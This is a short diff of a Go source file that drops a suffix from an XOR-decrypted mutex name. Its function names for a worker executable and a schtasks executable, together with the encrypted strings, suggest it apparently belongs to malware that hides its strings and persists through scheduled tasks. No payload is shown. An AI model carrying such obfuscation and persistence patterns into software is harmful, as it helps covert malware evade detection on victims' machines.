@@ -36,7 +36,7 @@ func getWorkerExeName() string {
 }
 
 func getMutexName() string {
-	return string(xor(encMutexName, decryptionKey)) + "_B3F2A"
+	return string(xor(encMutexName, decryptionKey))
 }
 
 func getSchtasksExeName() string {
